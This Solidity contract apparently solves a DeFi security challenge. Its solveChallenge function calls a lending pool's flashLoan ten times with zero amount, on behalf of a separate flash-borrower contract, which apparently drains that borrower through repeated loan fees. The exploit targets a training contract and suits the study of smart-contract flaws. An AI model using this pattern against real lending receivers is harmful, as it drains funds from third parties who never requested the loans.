// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverSolution {
    NaiveReceiverLenderPool public naiveReceiverLenderPool;
    IERC3156FlashBorrower public iERC3156FlashBorrower;
    address public token;

    constructor(
        address naiveReceiverLenderPoolAddress,
        address iERC3156FlashBorrowerAddress
    ) {
        naiveReceiverLenderPool = NaiveReceiverLenderPool(
            payable(naiveReceiverLenderPoolAddress)
        );
        iERC3156FlashBorrower = IERC3156FlashBorrower(
            iERC3156FlashBorrowerAddress
        );
        token = naiveReceiverLenderPool.ETH();
    }

    function solveChallenge() public {
        for (uint256 i = 0; i < 10; i++) {
            naiveReceiverLenderPool.flashLoan(
                iERC3156FlashBorrower,
                token,
                0,
                ""
            );
        }
    }
}
